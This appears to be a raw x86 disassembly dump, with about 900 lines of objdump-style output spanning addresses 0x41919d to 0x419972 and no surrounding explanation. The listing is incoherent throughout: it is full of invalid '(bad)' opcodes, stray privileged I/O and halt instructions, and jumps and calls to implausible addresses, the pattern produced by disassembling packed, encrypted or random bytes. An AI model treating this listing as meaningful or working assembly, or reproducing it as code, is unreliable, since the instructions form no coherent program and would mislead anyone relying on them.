  41919d:	(bad)  
  41919e:	sti    
  41919f:	mov    WORD PTR [esp+ecx*1],?
  4191a2:	lods   al,BYTE PTR ds:[esi]
  4191a3:	push   ss
  4191a4:	aam    0x5f
  4191a6:	jo     0x41915a
  4191a8:	aaa    
  4191a9:	adc    eax,0x6a7fe68a
  4191ae:	dec    ebp
  4191af:	mov    edi,0x32dbb725
  4191b4:	mov    edi,0x696c0441
  4191b9:	add    ecx,esp
  4191bb:	ins    DWORD PTR es:[edi],dx
  4191bc:	jmp    0x41913f
  4191be:	(bad)  
  4191bf:	pop    ss
  4191c0:	out    dx,eax
  4191c1:	inc    ecx
  4191c2:	xor    DWORD PTR [esi],ebp
  4191c4:	xor    eax,0xae4edee8
  4191c9:	popa   
  4191ca:	cmp    DWORD PTR [eax+0x37],0xc7e206d9
  4191d1:	mov    cs:0x17b991c8,al
  4191d7:	(bad)  
  4191d8:	push   cs
  4191d9:	int    0xca
  4191db:	retf   
  4191dc:	inc    esp
  4191dd:	out    dx,eax
  4191de:	into   
  4191df:	inc    ecx
  4191e0:	fcomp  DWORD PTR [esi-0xc]
  4191e3:	pop    esp
  4191e4:	es aaa 
  4191e6:	inc    edx
  4191e7:	shr    BYTE PTR [esi+0x7093cd0c],0x41
  4191ee:	jp     0x4191fe
  4191f0:	adc    ebx,DWORD PTR es:[eax-0x4c2bee96]
  4191f7:	ins    DWORD PTR es:[edi],dx
  4191f8:	(bad)  
  4191f9:	fsubr  QWORD PTR [ebp-0x56]
  4191fc:	jl     0x41919a
  4191fe:	pop    esi
  4191ff:	pop    esi
  419200:	shl    BYTE PTR [ecx+eax*1],0xb
  419204:	push   esp
  419205:	sbb    cl,dh
  419207:	ja     0x4191c2
  419209:	or     eax,0x2af58688
  41920e:	xchg   ecx,eax
  41920f:	(bad)  
  419210:	jge    0x4191e8
  419212:	rcr    DWORD PTR ds:0xb1c5b9b9,cl
  419218:	xor    eax,0x97d10e0e
  41921d:	hlt    
  41921e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41921f:	push   ss
  419220:	pop    edx
  419221:	sbb    DWORD PTR [edi+0x36],0x6653cf11
  419228:	dec    esp
  419229:	jns    0x419247
  41922b:	ins    BYTE PTR es:[edi],dx
  41922c:	xor    cl,dl
  41922e:	das    
  41922f:	in     al,dx
  419230:	je     0x419277
  419232:	loope  0x419211
  419234:	stos   BYTE PTR es:[edi],al
  419235:	loop   0x41928a
  419237:	pop    eax
  419238:	mov    ds,ebx
  41923a:	test   edi,0xd3750d64
  419240:	cmp    BYTE PTR ds:0xfeed8bbf,cl
  419246:	and    DWORD PTR [eax-0x53115cb3],0xb609783
  419250:	out    dx,al
  419251:	out    dx,eax
  419252:	inc    ebp
  419253:	sub    BYTE PTR [edx],bl
  419255:	xor    eax,0x1a8c1769
  41925a:	fisub  DWORD PTR [edx+0x5d302de7]
  419260:	pop    ds
  419261:	stos   BYTE PTR es:[edi],al
  419262:	lods   eax,DWORD PTR ds:[esi]
  419263:	in     eax,0xfb
  419265:	cmp    esp,DWORD PTR [esi+0x75]
  419268:	add    esi,esi
  41926a:	mov    ebp,0xe2f2e483
  41926f:	or     ebx,DWORD PTR [ebx]
  419271:	xchg   edx,eax
  419272:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419273:	lods   al,BYTE PTR ds:[esi]
  419274:	xchg   ebx,eax
  419275:	sub    ebx,DWORD PTR [eax-0x33e9c06f]
  41927b:	adc    DWORD PTR ds:0x114f94ae,esi
  419281:	jo     0x419225
  419283:	xchg   esp,eax
  419284:	fs daa 
  419286:	or     bh,BYTE PTR [esi+0x18947e84]
  41928c:	jl     0x41924a
  41928e:	(bad)  
  41928f:	push   ds
  419290:	cmp    al,ah
  419292:	push   0xffffff81
  419294:	or     eax,0x43446091
  419299:	ja     0x41926b
  41929b:	jle    0x419312
  41929d:	sbb    DWORD PTR [edx],esi
  41929f:	sbb    al,0xe0
  4192a1:	mov    cl,BYTE PTR [ebx]
  4192a3:	lahf   
  4192a4:	adc    BYTE PTR [edi],al
  4192a6:	out    dx,al
  4192a7:	adc    dl,ah
  4192a9:	fist   DWORD PTR [edi+0xc]
  4192ac:	jne    0x41930f
  4192ae:	int3   
  4192af:	(bad)  
  4192b0:	pusha  
  4192b1:	test   BYTE PTR ds:0xb65bcaad,0x45
  4192b8:	dec    edi
  4192b9:	and    eax,0xaf9c3486
  4192be:	loopne 0x419336
  4192c0:	mov    edi,0xf733e0d3
  4192c5:	and    al,0xe2
  4192c7:	jmp    0xdb10c87e
  4192cc:	repz sti 
  4192ce:	mov    eax,0xe981d497
  4192d3:	add    ebp,DWORD PTR [eax+eiz*4]
  4192d6:	mov    al,0x76
  4192d8:	jmp    0x4192c5
  4192da:	jo     0x4192a5
  4192dc:	dec    ebx
  4192dd:	dec    ebx
  4192de:	or     al,0x9c
  4192e0:	mov    ebx,0x4a501fc7
  4192e5:	mov    dl,0xf
  4192e7:	cmp    ch,BYTE PTR [esi-0x33]
  4192ea:	lds    esi,FWORD PTR [ebp-0x49]
  4192ed:	sub    eax,0xd3c97635
  4192f2:	aam    0x49
  4192f4:	mov    edi,0x6d53620
  4192f9:	std    
  4192fa:	addr16 ds in eax,dx
  4192fd:	fnstsw WORD PTR [ebp-0x6e]
  419300:	pusha  
  419301:	cs retf 
  419303:	mov    BYTE PTR [eax+0x20],bl
  419306:	adc    BYTE PTR [ebx+edx*2-0x7fc13b45],0xa5
  41930e:	sbb    dl,ah
  419310:	lods   eax,DWORD PTR ds:[esi]
  419311:	push   ebp
  419312:	or     al,0x8a
  419314:	cwde   
  419315:	dec    ebp
  419316:	stc    
  419317:	jmp    0x4192cd
  419319:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41931a:	out    dx,eax
  41931b:	mov    ch,0x26
  41931d:	mov    bl,dh
  41931f:	out    0x93,eax
  419321:	int    0xb6
  419323:	push   esp
  419324:	jmp    0x4192f0
  419326:	push   esp
  419327:	fisub  DWORD PTR [esi+0x1b4b149d]
  41932d:	dec    eax
  41932e:	dec    ebp
  41932f:	icebp  
  419330:	lods   eax,DWORD PTR ds:[esi]
  419331:	fwait
  419332:	lahf   
  419333:	fwait
  419334:	imul   edi,DWORD PTR [ebp+ebx*8-0x5136e91f],0x72e8fe9f
  41933f:	jg     0x4192d3
  419341:	rcl    dl,cl
  419343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419344:	das    
  419345:	jecxz  0x4192fe
  419347:	js     0x4aea5953
  41934d:	pusha  
  41934e:	mov    ecx,0x596ca92b
  419353:	add    DWORD PTR [ecx+esi*8+0x47a93001],esi
  41935a:	push   esp
  41935b:	outs   dx,DWORD PTR ds:[esi]
  41935c:	popa   
  41935d:	or     eax,esi
  41935f:	fstp   TBYTE PTR [edi]
  419361:	das    
  419362:	and    BYTE PTR [edx-0x28d8f494],ch
  419368:	loopne 0x4192f5
  41936a:	loop   0x419352
  41936c:	sub    eax,0x5edacbe5
  419371:	out    dx,eax
  419372:	xchg   ecx,eax
  419373:	cmp    bl,cl
  419375:	push   es
  419376:	and    eax,0xdd5a91d2
  41937b:	div    BYTE PTR [edi+ebp*2-0x35]
  41937f:	sti    
  419380:	pop    ss
  419381:	shr    BYTE PTR [ebx],1
  419383:	(bad)  
  419384:	test   BYTE PTR es:[ecx+0x53],bh
  419388:	or     DWORD PTR [eax+0x2af68220],edx
  41938e:	push   ebx
  41938f:	inc    eax
  419390:	xlat   BYTE PTR ds:[ebx]
  419391:	push   ebx
  419392:	pop    edi
  419394:	fwait
  419395:	out    dx,eax
  419396:	psubq  mm0,QWORD PTR [ebp+esi*4+0x2a]
  41939b:	jp     0x419334
  41939d:	pop    ebp
  41939e:	inc    esp
  41939f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193a0:	sbb    ebx,DWORD PTR [ebp+0x27858952]
  4193a6:	test   al,0xbf
  4193a8:	retf   
  4193a9:	mov    BYTE PTR [edx-0x51],al
  4193ac:	sub    eax,0x808ccebd
  4193b1:	mov    dh,0x9
  4193b3:	in     al,0x49
  4193b5:	or     ch,BYTE PTR [ebp-0x68734c7e]
  4193bb:	dec    esi
  4193bc:	mov    ebx,DWORD PTR [ebp+0x58]
  4193bf:	sbb    DWORD PTR [esp-0x54ca0304],0xffffffb0
  4193c7:	adc    al,0x4d
  4193c9:	cmp    eax,0xa1ee7458
  4193ce:	push   ecx
  4193cf:	addr16 push esi
  4193d1:	das    
  4193d2:	aam    0xf6
  4193d4:	(bad)  [ebp-0x2a8f1fdf]
  4193da:	in     eax,0x23
  4193dc:	sub    al,0x9e
  4193de:	test   bl,0xee
  4193e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193e2:	cld    
  4193e3:	aas    
  4193e4:	pop    ds
  4193e5:	lods   eax,DWORD PTR ds:[esi]
  4193e6:	jae    0x41942a
  4193e8:	push   ds
  4193e9:	das    
  4193ea:	rcr    eax,cl
  4193ec:	jp     0x4193c6
  4193ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193ef:	fisttp WORD PTR [esi+0x20]
  4193f2:	sets   BYTE PTR [edx+0x40]
  4193f6:	or     eax,0x16d27206
  4193fb:	call   0xc704a9b5
  419400:	sti    
  419401:	inc    ecx
  419402:	jmp    0x4d4a:0xa6699f0d
  419409:	pop    edx
  41940a:	fmul   QWORD PTR [esi-0x60]
  41940d:	inc    esp
  41940e:	sub    al,0x7a
  419410:	mov    ebx,0x78c2fcd5
  419415:	repnz sbb ch,BYTE PTR [ecx-0x10]
  419419:	jns    0x419425
  41941b:	adc    ch,dh
  41941d:	sub    ebp,esp
  41941f:	and    BYTE PTR [esi+0x2d],dh
  419422:	rol    esp,cl
  419424:	aam    0x2e
  419426:	xchg   esp,eax
  419427:	sub    al,al
  419429:	jo     0x41943d
  41942b:	rol    BYTE PTR [esi],0x97
  41942e:	or     DWORD PTR [esi],esp
  419430:	mov    bl,0x48
  419432:	jb     0x419489
  419434:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419435:	shl    DWORD PTR [eax+0x5a28e5f5],cl
  41943b:	arpl   WORD PTR [esp+ebp*1],ax
  41943e:	sbb    bh,dh
  419440:	add    BYTE PTR [ecx-0x2d],cl
  419443:	loop   0x41942e
  419445:	jp     0x4193e8
  419447:	inc    ecx
  419448:	mov    bh,0x1e
  41944a:	inc    edx
  41944b:	data16 shl BYTE PTR [ebx-0x58355099],0xd
  419453:	in     al,0x93
  419455:	out    dx,eax
  419456:	or     cl,bh
  419458:	pusha  
  419459:	pop    ecx
  41945a:	jnp    0x41947f
  41945c:	into   
  41945d:	call   0xcf48549
  419462:	push   es
  419463:	inc    esp
  419464:	pop    eax
  419465:	xchg   ebx,eax
  419466:	scas   eax,DWORD PTR es:[edi]
  419467:	inc    esp
  419468:	or     DWORD PTR [esi-0x6b],ebx
  41946b:	(bad)  
  41946c:	scas   al,BYTE PTR es:[edi]
  41946d:	push   ebp
  41946e:	ss dec ebp
  419470:	test   DWORD PTR [eax+0x64f6baa4],0x70c83eae
  41947a:	pop    esp
  41947b:	and    eax,0xe1617faa
  419480:	add    ecx,ebp
  419482:	fucomip st,st(6)
  419484:	jbe    0x419501
  419486:	lock adc ch,BYTE PTR [ebx+esi*2-0x5f7d20e9]
  41948e:	or     BYTE PTR [edi],bh
  419490:	or     DWORD PTR [edx+0x5d397cdc],esp
  419496:	add    al,0x75
  419498:	into   
  419499:	scas   al,BYTE PTR es:[edi]
  41949a:	shl    BYTE PTR [eax],0xd7
  41949d:	xchg   ebp,eax
  41949e:	xor    eax,0xfb54a0eb
  4194a3:	aas    
  4194a4:	lock out 0x38,eax
  4194a7:	sbb    BYTE PTR [esi+0x72603cb3],cl
  4194ad:	mov    dl,0x9c
  4194af:	adc    cl,BYTE PTR [edi-0x7d4d2d0f]
  4194b5:	(bad)  
  4194b6:	cmp    eax,0xcaa90bba
  4194bb:	mov    edi,0x284aae82
  4194c0:	imul   edi,DWORD PTR [ebx+0x7c],0xffffff8f
  4194c4:	fistp  QWORD PTR [eax+ebp*1+0x17]
  4194c8:	setp   cl
  4194cb:	cdq    
  4194cc:	and    DWORD PTR [ebx],edx
  4194ce:	out    0x72,eax
  4194d0:	ins    BYTE PTR es:[edi],dx
  4194d1:	rcr    DWORD PTR [esi],1
  4194d3:	xchg   esi,eax
  4194d4:	stos   DWORD PTR es:[edi],eax
  4194d5:	sti    
  4194d6:	in     al,0xc7
  4194d8:	out    dx,al
  4194d9:	add    cl,cl
  4194db:	enter  0xbfc2,0x92
  4194df:	jno    0x41951e
  4194e1:	jg     0x419536
  4194e3:	out    0xc3,al
  4194e5:	test   al,0x4a
  4194e7:	ja     0x419506
  4194e9:	pop    edi
  4194ea:	adc    DWORD PTR [edx-0x1f],esp
  4194ed:	jmp    0xd99ffdc7
  4194f2:	imul   ecx,DWORD PTR [eax+0x1a],0x483b559
  4194f9:	shl    DWORD PTR [edx+edx*8-0x6606fe08],0xea
  419501:	adc    bl,BYTE PTR ds:0x353049d6
  419507:	in     al,dx
  419508:	and    al,0x22
  41950a:	daa    
  41950b:	push   esi
  41950c:	jae    0x41948f
  41950e:	pop    eax
  41950f:	mov    dh,0x62
  419511:	sub    eax,0xd2ee012a
  419516:	mov    DWORD PTR [edi],0x25ec51be
  41951c:	rcl    DWORD PTR [ecx-0x3afbd11e],cl
  419522:	(bad)  
  419523:	push   eax
  419524:	jbe    0x4194f6
  419526:	adc    esp,DWORD PTR [ebx-0x7eeddeef]
  41952c:	(bad)  
  41952e:	fstp   TBYTE PTR [ecx+0x332a5d21]
  419534:	push   es
  419535:	pushf  
  419536:	out    0xb7,eax
  419538:	dec    edx
  419539:	cmc    
  41953a:	sbb    dl,cl
  41953c:	push   ebp
  41953d:	xchg   BYTE PTR [ecx+ecx*4-0x4e],dl
  419541:	arpl   WORD PTR ds:0xab1dcd4c,di
  419547:	jb     0x4194d8
  419549:	sub    eax,0x5e231e6f
  41954e:	and    DWORD PTR [eax],esp
  419550:	nop
  419551:	pop    ebp
  419552:	pop    ds
  419553:	push   ecx
  419554:	sbb    edi,ebx
  419556:	loopne 0x41950a
  419558:	mov    dh,0x72
  41955a:	and    al,0x59
  41955c:	add    eax,0x2a028262
  419561:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419562:	(bad)  
  419563:	ja     0x4195d6
  419565:	pop    ebp
  419566:	dec    ebp
  419567:	mov    ah,0x7c
  419569:	adc    eax,0xd9271695
  41956e:	cmp    eax,0xe5f51764
  419573:	push   ecx
  419574:	lahf   
  419575:	cdq    
  419576:	sbb    bh,BYTE PTR [esi-0x46]
  419579:	dec    esp
  41957a:	push   edi
  41957b:	mov    DWORD PTR [eax-0x63968aa4],0x30d7d0b3
  419585:	and    dl,BYTE PTR [eax+ecx*2-0x21]
  419589:	sub    edi,DWORD PTR [ecx-0x10]
  41958c:	cmp    ah,BYTE PTR [ebp-0x5b085641]
  419592:	fcmovnu st,st(1)
  419594:	scas   al,BYTE PTR es:[edi]
  419595:	and    edx,ecx
  419597:	cli    
  419598:	fisub  DWORD PTR [esi]
  41959a:	jb     0x4195fe
  41959c:	mov    BYTE PTR [ecx],cl
  41959e:	fdivr  st,st(3)
  4195a0:	test   eax,0xac82873f
  4195a5:	repz sbb ecx,ecx
  4195a8:	inc    esi
  4195a9:	push   0xffffffc4
  4195ab:	mov    cl,0x91
  4195ad:	in     eax,0x88
  4195af:	iret   
  4195b0:	mov    WORD PTR [ebx-0xecb5419],ds
  4195b6:	fwait
  4195b7:	div    eax
  4195b9:	stos   DWORD PTR es:[edi],eax
  4195ba:	jnp    0x419639
  4195bc:	add    cl,BYTE PTR [esi]
  4195be:	sbb    bl,BYTE PTR [edx]
  4195c0:	mov    DWORD PTR [esi+0x5e954910],esp
  4195c6:	fisubr DWORD PTR [edx+0x5b]
  4195c9:	mov    ebp,0xe928370b
  4195ce:	lahf   
  4195cf:	iret   
  4195d0:	sbb    eax,0x7257a305
  4195d5:	adc    ch,BYTE PTR [eax-0x9383d78]
  4195db:	add    al,0x4c
  4195dd:	mov    al,ds:0xaf0e3215
  4195e2:	(bad)  
  4195e3:	aam    0x97
  4195e5:	data16 mov dl,0x81
  4195e8:	sub    eax,0x5f356a9e
  4195ed:	jns    0x41960c
  4195ef:	jp     0x419589
  4195f1:	add    eax,0xc604b2f9
  4195f6:	stos   DWORD PTR es:[edi],eax
  4195f7:	adc    eax,0xc2566bd8
  4195fc:	das    
  4195fd:	out    dx,eax
  4195fe:	(bad)  
  4195ff:	or     BYTE PTR [esi-0x5a41eeab],ah
  419605:	add    BYTE PTR [esp+edx*8-0x7e],bl
  419609:	repnz fsubr DWORD PTR [edx]
  41960c:	test   DWORD PTR [esi-0x6180dfca],0x1fa1444f
  419616:	and    edx,DWORD PTR [eax]
  419618:	repz or BYTE PTR [ecx],dl
  41961b:	mov    bh,0x7c
  41961d:	push   ebp
  41961e:	mov    bl,0xe7
  419620:	addr16 call 0x88a83ece
  419626:	(bad)  
  419627:	adc    BYTE PTR [eax+0x54a65fce],dl
  41962d:	fistp  WORD PTR [ebx]
  41962f:	sub    eax,0x3eb5314
  419634:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419635:	fisttp DWORD PTR [esi+0x350b5744]
  41963b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41963c:	sub    DWORD PTR [ecx-0x68],0x5ca64b6e
  419643:	push   ecx
  419644:	test   eax,0x1ce79b16
  419649:	shl    ecx,1
  41964b:	scas   al,BYTE PTR es:[edi]
  41964c:	cmc    
  41964d:	jb     0x41960d
  41964f:	lea    edi,[esp+ebp*1+0x2]
  419653:	push   ecx
  419654:	push   0x2af239d5
  419659:	add    cl,BYTE PTR [ebx+0x224aa4f]
  41965f:	add    BYTE PTR [edx+0x650ae9a6],ch
  419665:	xor    al,0x77
  419667:	ja     0x4195fd
  419669:	add    al,0x13
  41966b:	fnstcw WORD PTR [esi]
  41966d:	xchg   ecx,eax
  41966e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41966f:	mov    edx,0x3e2806de
  419674:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419675:	adc    DWORD PTR [esi+ebp*1],ecx
  419678:	push   ebp
  419679:	mov    BYTE PTR [eax],bl
  41967b:	jne    0x4196f4
  41967d:	mov    bl,0xee
  41967f:	and    eax,0xfaa34367
  419684:	ret    
  419685:	and    eax,0xe2d2a0e9
  41968a:	sub    ebp,ebp
  41968c:	cld    
  41968d:	cmp    esp,ecx
  41968f:	aas    
  419690:	hlt    
  419691:	sbb    BYTE PTR [esp+esi*4+0x49b2ad41],cl
  419698:	and    DWORD PTR [edi],edi
  41969a:	arpl   WORD PTR [edx+0x59],si
  41969d:	mov    cs,WORD PTR [edx+0x4de2966e]
  4196a3:	jns    0x41968d
  4196a5:	xor    edi,DWORD PTR [eax-0x68e7a2f7]
  4196ab:	repz scas al,BYTE PTR es:[edi]
  4196ad:	stc    
  4196ae:	fcomp  QWORD PTR [ecx-0x5fa024f4]
  4196b4:	retf   
  4196b5:	inc    esp
  4196b6:	inc    ecx
  4196b7:	icebp  
  4196b8:	gs pop es
  4196ba:	fimul  WORD PTR [edx+0x58]
  4196bd:	(bad)  
  4196be:	imul   ecx,DWORD PTR [ebx-0x4b],0x572538f7
  4196c5:	pop    gs
  4196c7:	pop    es
  4196c8:	ret    
  4196c9:	pop    es
  4196ca:	dec    edx
  4196cb:	sahf   
  4196cc:	cmp    cl,BYTE PTR [edi]
  4196ce:	out    dx,eax
  4196cf:	xchg   edx,eax
  4196d0:	jge    0x4196e6
  4196d2:	push   ss
  4196d3:	pop    eax
  4196d4:	sbb    eax,0xaaa51eaf
  4196d9:	out    0x3b,al
  4196db:	pop    ss
  4196dc:	data16 cli 
  4196de:	dec    eax
  4196df:	or     DWORD PTR [eax+0x3838c4a4],ecx
  4196e5:	pop    ecx
  4196e6:	xchg   esp,eax
  4196e7:	or     eax,0xfa367b49
  4196ec:	mov    dl,0xa0
  4196ee:	mov    dh,0x91
  4196f0:	or     ebp,ebp
  4196f2:	nop
  4196f3:	add    dl,BYTE PTR [ecx+0x2a]
  4196f6:	dec    ebx
  4196f7:	(bad)  
  4196f8:	shl    BYTE PTR [eax+0x8bede5d],0xe
  4196ff:	repz push eax
  419701:	cmp    eax,0xc4f13c9
  419706:	stc    
  419707:	icebp  
  419708:	pusha  
  419709:	add    edx,0x38f4b7f6
  41970f:	pop    es
  419710:	inc    ecx
  419711:	and    al,0xdc
  419713:	dec    eax
  419714:	mov    edx,0x5c15bc7b
  419719:	sbb    BYTE PTR [edi],bh
  41971b:	or     ch,dh
  41971d:	stos   BYTE PTR es:[edi],al
  41971e:	std    
  41971f:	call   0x55709a6b
  419724:	inc    eax
  419725:	dec    eax
  419726:	cmp    dl,bh
  419728:	stos   BYTE PTR es:[edi],al
  419729:	mov    gs,WORD PTR [eax+0x3f]
  41972c:	out    0x93,al
  41972e:	cmp    DWORD PTR [ecx+0x71],0xfcf7d988
  419735:	add    eax,0xdc0949e8
  41973a:	das    
  41973b:	adc    eax,0xe706d338
  419740:	sbb    BYTE PTR [ecx+0x41],0xe
  419744:	jae    0x41973b
  419746:	xor    al,0x79
  419748:	xchg   ebp,eax
  419749:	push   DWORD PTR [ebx]
  41974b:	xor    al,0xc7
  41974d:	cmp    eax,DWORD PTR [eax-0x1f]
  419750:	mov    ebx,0xc527dda3
  419755:	mov    ecx,fs
  419757:	arpl   WORD PTR [edi],sp
  419759:	jg     0x4196e7
  41975b:	test   DWORD PTR [ebx],edx
  41975d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41975e:	dec    ebx
  41975f:	stc    
  419760:	scas   eax,DWORD PTR es:[edi]
  419761:	test   al,0xd4
  419763:	adc    eax,0x54060e97
  419768:	scas   al,BYTE PTR es:[edi]
  419769:	xor    al,0x12
  41976b:	pop    ds
  41976c:	xchg   esp,eax
  41976d:	loope  0x41975e
  41976f:	pop    ss
  419770:	pop    edi
  419771:	sub    eax,0x3ebbbaa1
  419776:	iret   
  419777:	pop    ebx
  419778:	call   0x37dec880
  41977d:	push   esp
  41977e:	jmp    0x646b6ec7
  419783:	scas   al,BYTE PTR es:[edi]
  419784:	pop    edi
  419785:	lahf   
  419786:	or     eax,0xe4726edd
  41978b:	test   eax,0x5a31de48
  419790:	stos   DWORD PTR es:[edi],eax
  419791:	aaa    
  419792:	arpl   WORD PTR [ebx],sp
  419794:	scas   eax,DWORD PTR es:[edi]
  419795:	stc    
  419796:	adc    BYTE PTR [eax-0x7],dl
  419799:	xchg   ebp,eax
  41979a:	sbb    ah,cl
  41979c:	jb     0x4197d4
  41979e:	repz test ch,0xa
  4197a2:	mov    bl,0x13
  4197a4:	jno    0x41980f
  4197a6:	inc    eax
  4197a7:	add    BYTE PTR [ebp+0x6c364298],0x99
  4197ae:	pusha  
  4197af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197b0:	inc    edx
  4197b1:	lds    esi,FWORD PTR [edi-0x6a]
  4197b4:	and    bl,BYTE PTR [ebx-0x3ef9efa6]
  4197ba:	jmp    FWORD PTR [ecx]
  4197bc:	adc    eax,0x1a83f2a3
  4197c1:	mov    eax,ds:0x344e9089
  4197c6:	aad    0x0
  4197c8:	scas   al,BYTE PTR es:[edi]
  4197c9:	popa   
  4197ca:	push   ebp
  4197cb:	icebp  
  4197cc:	mov    eax,ds:0xe4a86c85
  4197d1:	int    0x15
  4197d3:	lods   al,BYTE PTR gs:[esi]
  4197d5:	mov    al,ds:0xe6896951
  4197da:	dec    eax
  4197db:	aad    0xda
  4197dd:	leave  
  4197de:	mov    ch,0x8e
  4197e0:	cdq    
  4197e1:	stos   DWORD PTR es:[edi],eax
  4197e2:	repz adc DWORD PTR [edi+esi*8-0x522753c6],edi
  4197ea:	push   esp
  4197eb:	pop    esp
  4197ec:	pop    esp
  4197ed:	pop    ss
  4197ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197ef:	into   
  4197f0:	int3   
  4197f1:	jge    0x419829
  4197f3:	jecxz  0x41981e
  4197f5:	mov    al,0xc7
  4197f7:	les    edi,FWORD PTR [ebp+0x405e71b8]
  4197fd:	push   esp
  4197fe:	cld    
  4197ff:	shr    BYTE PTR [edx-0x2c],cl
  419802:	push   esp
  419803:	into   
  419804:	std    
  419805:	jo     0x419836
  419807:	(bad)  
  419808:	mov    ds,eax
  41980a:	pop    ebx
  41980b:	dec    edx
  41980c:	inc    ebx
  41980d:	adc    eax,DWORD PTR [ebx+edi*2-0x45]
  419811:	inc    edi
  419812:	daa    
  419813:	mov    dh,0x59
  419815:	pop    esp
  419816:	adc    ebx,0x7a
  419819:	adc    dh,BYTE PTR [eax-0x287f2c22]
  41981f:	loop   0x4197d0
  419821:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419822:	iret   
  419823:	fisubr WORD PTR [ecx-0x7f]
  419826:	ret    0x47c2
  419829:	lds    edx,FWORD PTR [edi+0x5d]
  41982c:	jno    0x4197b0
  41982e:	adc    ah,BYTE PTR [esi-0x654a2d44]
  419834:	test   BYTE PTR [ebx-0x30],bl
  419837:	jb     0x419872
  419839:	push   DWORD PTR [edx-0x45]
  41983c:	sub    DWORD PTR [ecx],edi
  41983e:	mov    eax,ds:0xa5ffdc2f
  419843:	ret    0x8f5
  419846:	push   ds
  419847:	xchg   ecx,eax
  419848:	push   es
  419849:	sub    al,0x19
  41984b:	shl    BYTE PTR [ecx],0x9e
  41984e:	ret    
  41984f:	int3   
  419850:	jnp    0x41988a
  419852:	test   dl,0x7f
  419855:	xor    bl,BYTE PTR [esi]
  419857:	std    
  419858:	add    al,dl
  41985a:	jno    0x4198ad
  41985c:	push   ss
  41985d:	scas   al,BYTE PTR es:[edi]
  41985e:	gs mov dl,0x9a
  419861:	or     al,0xed
  419863:	jae    0x41984e
  419865:	mov    ch,dl
  419867:	lods   al,BYTE PTR ds:[esi]
  419868:	retf   0xab75
  41986b:	ins    DWORD PTR es:[edi],dx
  41986c:	das    
  41986d:	xor    ebx,edx
  41986f:	xchg   DWORD PTR [esi-0x4a4638b8],ebx
  419875:	inc    edx
  419876:	jp     0x419834
  419878:	fucomp st(3)
  41987a:	stc    
  41987b:	inc    esi
  41987c:	aam    0x1
  41987e:	loop   0x41982e
  419880:	xchg   ebp,eax
  419881:	inc    edi
  419882:	pop    es
  419883:	adc    bh,bh
  419885:	(bad)  
  419887:	inc    ecx
  419888:	add    cl,BYTE PTR [edx+ebp*4-0x19]
  41988c:	pop    ecx
  41988d:	xchg   ecx,eax
  41988e:	mov    ecx,0x9ac6e99
  419893:	mov    eax,ds:0x6e7612bd
  419898:	inc    ebx
  419899:	jl     0x4198eb
  41989b:	xchg   esi,eax
  41989c:	rcl    DWORD PTR [ebp+0x69],cl
  41989f:	or     BYTE PTR [esi+ebp*2-0x480e782c],bl
  4198a6:	dec    ebp
  4198a7:	sbb    eax,0x5c258294
  4198ac:	jb     0x419832
  4198ae:	inc    ecx
  4198af:	or     ebx,DWORD PTR cs:[ebp-0x395f2add]
  4198b6:	pop    ds
  4198b7:	es mov ebx,0xbeeda408
  4198bd:	js     0x41988a
  4198bf:	sti    
  4198c0:	xchg   esi,eax
  4198c1:	or     DWORD PTR [ecx],esp
  4198c3:	xor    edi,DWORD PTR [ecx+0x4872dfcc]
  4198c9:	sbb    edx,edx
  4198cb:	clc    
  4198cc:	adc    al,0x49
  4198ce:	pusha  
  4198cf:	imul   DWORD PTR [esi+0x63aea7af]
  4198d5:	rcr    BYTE PTR [edi+0x4edc9de3],0xf9
  4198dc:	and    ch,BYTE PTR [edi+0x443e7dd5]
  4198e2:	(bad)  
  4198e3:	stc    
  4198e4:	and    BYTE PTR ds:0x46b17b0a,ch
  4198ea:	(bad)  
  4198eb:	dec    edi
  4198ec:	sti    
  4198ed:	sub    DWORD PTR [ecx],0xf8844dbb
  4198f3:	jle    0x4198cb
  4198f5:	je     0x419887
  4198f7:	(bad)  
  4198f8:	mov    eax,0xe9e860b4
  4198fd:	mov    edx,0xbba11a87
  419902:	test   BYTE PTR [ebx+0x24],bl
  419905:	gs or  cl,bl
  419908:	mov    ch,0x68
  41990a:	push   esp
  41990b:	push   eax
  41990c:	mov    cl,0x65
  41990e:	ds mov dl,0x8
  419911:	mov    bh,0x33
  419913:	or     BYTE PTR [ecx-0x172e24f4],dl
  419919:	dec    ecx
  41991a:	ins    DWORD PTR es:[edi],dx
  41991b:	fwait
  41991c:	int    0xd3
  41991e:	xor    al,0xa7
  419920:	cmove  ebx,DWORD PTR [di-0x253a]
  419926:	les    ecx,FWORD PTR [edx-0x2a8c4a8b]
  41992c:	fbld   TBYTE PTR [eax+edx*1-0x40]
  419930:	add    BYTE PTR [ecx],dl
  419932:	(bad)  
  419933:	fisubr WORD PTR [ebp-0x6ba9eebe]
  419939:	imul   ebx,DWORD PTR [ebx-0x9e03ddd],0x75e37142
  419943:	and    eax,0x1de7bb1e
  419948:	or     al,0xe0
  41994a:	xor    esi,DWORD PTR [ebx]
  41994c:	(bad)  
  41994d:	cmp    ah,BYTE PTR [esi+0x61]
  419950:	or     bh,dh
  419952:	sub    bl,BYTE PTR [ebx+eax*8+0x75084c6c]
  419959:	mov    ch,0x7f
  41995b:	xor    al,BYTE PTR [eax+ebp*4-0x4d]
  41995f:	shr    DWORD PTR [eax-0xca7cfbe],1
  419965:	iret   
  419966:	(bad)  
  419967:	fld    DWORD PTR [eax+0x54637b9a]
  41996d:	push   edx
  41996e:	inc    esi
  41996f:	sar    al,cl
  419971:	push   ds
  419972:	(bad)  
